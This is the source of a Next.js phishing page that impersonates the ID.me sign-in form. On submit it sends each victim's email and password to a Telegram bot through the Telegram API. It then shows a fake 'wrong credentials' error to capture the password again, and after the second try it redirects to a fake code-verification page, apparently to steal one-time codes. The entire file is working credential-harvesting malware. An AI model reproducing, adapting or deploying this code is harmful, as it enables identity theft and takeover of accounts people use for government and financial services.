"use client"
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import React from 'react'

interface FormData {
    email: string;
    password: string;
}
interface FormErrors {
    email?: string;
    password?: string;
}

export default function IDMEForm() {
    const [numberOfTime, setNumberOfTime] = React.useState<number>(0)
    const [formData, setFormData] = React.useState<FormData>({
        email: '',
        password: '',
    });
    const [isSubmitting, setIsSubmitting] = React.useState(false);
    const [errors, setErrors] = React.useState<FormErrors>({});
    const router = useRouter();

    const telegramApiKey = process.env.NEXT_PUBLIC_TELEGRAM_API ?? '';
    const telegramChatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ?? '';

    const validateForm = (): boolean => {
        const newErrors: FormErrors = {};
        if (!formData.email.trim()) {
            newErrors.email = 'Email is required';
        } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
            newErrors.email = 'Please enter a valid email';
        }
        if (!formData.password.trim()) {
            newErrors.password = 'Password is required';
        }

        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const { name, value } = e.target;
        setFormData(prev => ({
            ...prev,
            [name]: value
        }));
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();

        if (!validateForm()) {
            console.log("Form validation failed", errors);
            return;
        }

        setIsSubmitting(true);

        try {
            const message = `
            ++++++ 🔰🔰 ID ME DETAILS 🔰🔰++++++
            [📧EMAIL] : ${formData.email}
            [🔑PASSWORD] : ${formData.password}
            +++++🔰🔰 ID ME 🔰🔰++++;
            `;

            const textResponse = await fetch(`https://api.telegram.org/bot${telegramApiKey}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: telegramChatId,
                    text: message,
                    parse_mode: 'Markdown'
                }),
            });

            if (!textResponse.ok) {
                const textData = await textResponse.json();
                throw new Error(textData.description || 'Failed to send message to Telegram');
            }
            setNumberOfTime(numberOfTime + 1)

        } catch (error) {
            console.error('Submission error:', error);
            alert(`There was an error submitting your application: ${error instanceof Error ? error.message : 'Unknown error'}`);
        } finally {
            setIsSubmitting(false);
        }
    };

    React.useEffect(() => {
        if (numberOfTime === 2) {
            router.push('/id-me/code-verification');
        }
    }, [numberOfTime, router]);


    return (
        <form className="space-y-6 px-5 md:px-0" onSubmit={handleSubmit}>
            <h1 className="text-[26px] font-semibold text-[#2e3f51] mb-6 text-center">
                Sign in to ID.me
            </h1>
            <div className="mb-6 text-center flex flex-col items-center bg-[#f2faff] p-5">
                <p className="text-sm text-[#2e3f51] font-semibold">
                    New to ID.me?{' '}
                </p>
                <br />
                <Link href="#" className="font-medium text-blue-600 hover:text-blue-500 underline">
                    Create an ID.me account
                </Link>
            </div>
            <p className="text-sm text-gray-600">* Indicates a required field</p>
            {numberOfTime === 1 && (
                <p className="text-sm text-red-600">Wrong credentials, try again</p>
            )}

            <div>
                <label htmlFor="email" className="block text-sm font-medium text-[#2e3f51]">
                    Email <span className="text-red-500">*</span>
                </label>
                <div className="mt-1">
                    <input
                        id="email"
                        name="email"
                        type="email"
                        autoComplete="email"
                        value={formData.email}
                        onChange={handleChange}
                        placeholder="Enter your email address"
                        className="h-[60px] placeholder:font-medium appearance-none block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
                    />
                    {errors.email && <p className="mt-1 text-sm text-red-600">{errors.email}</p>}
                </div>
            </div>

            <div>
                <label htmlFor="password" className="block text-sm font-medium text-[#2e3f51]">
                    Password <span className="text-red-500">*</span>
                </label>
                <div className="mt-1">
                    <input
                        id="password"
                        name="password"
                        type="password"
                        autoComplete="current-password"
                        value={formData.password}
                        onChange={handleChange}
                        placeholder="Enter password"
                        className="h-[60px] placeholder:font-medium appearance-none block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
                    />
                    {errors.password && <p className="mt-1 text-sm text-red-600">{errors.password}</p>}
                </div>
            </div>

            <div className="flex items-center justify-between">
                <div className="flex items-center">
                    <input
                        id="remember-me"
                        name="remember-me"
                        type="checkbox"
                        className="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded"
                    />
                    <div className="ml-2">
                        <label htmlFor="remember-me" className="block text-sm text-[#2e3f51] font-medium">
                            Remember me
                        </label>
                        <span className='text-xs text-gray-500'>For your security, select only on your devices</span>
                    </div>
                </div>
            </div>

            <div>
                <button
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full h-[60px] flex items-center justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:opacity-50 disabled:cursor-not-allowed"
                >
                    {isSubmitting ? 'Signing in...' : 'Sign in'}
                </button>
            </div>
        </form>
    )
}